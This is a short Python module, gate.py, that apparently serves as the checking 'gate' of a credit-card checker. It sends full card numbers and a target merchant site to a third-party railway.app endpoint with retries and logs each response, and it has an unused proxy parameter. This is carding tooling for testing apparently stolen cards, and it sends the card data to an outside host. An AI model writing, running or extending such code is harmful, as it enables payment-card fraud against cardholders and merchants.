### gate.py
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- NEW API ENDPOINT ---
# This is the new, working endpoint you provided.
CHECK_URL = "https://autoshbydiwas-production.up.railway.app/index.php"

def get_session():
    """Creates a robust requests session with retries."""
    session = requests.Session()
    retries = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[502, 503, 504, 522, 524],
        allowed_methods=["HEAD", "GET", "POST"]
    )
    session.mount('https://', HTTPAdapter(max_retries=retries))
    session.mount('http://', HTTPAdapter(max_retries=retries))
    return session

session = get_session()

def check_card(card, site, proxy):
    """
    Checks a credit card using the new third-party API endpoint.
    The 'proxy' parameter is kept for compatibility but is not used by this API.
    """
    check_site = f"https://{site}"
    
    print(f"[NEW API CHECK] Checking card: {card[:4]}********{card[-4:]} on site: {check_site}")

    params = {
        'site': check_site,
        'cc': card
    }
    
    try:
        resp = session.get(CHECK_URL, params=params, timeout=200)
        print(f"[RAW RESPONSE] Card: {card[:4]}**** | Site: {check_site} | Response: {resp.text[:200]}")
        return resp.text
        
    except Exception as e:
        print(f"[ERROR] Card: {card[:4]}**** | Exception during API call: {e}")
        return f"Error: {str(e)}"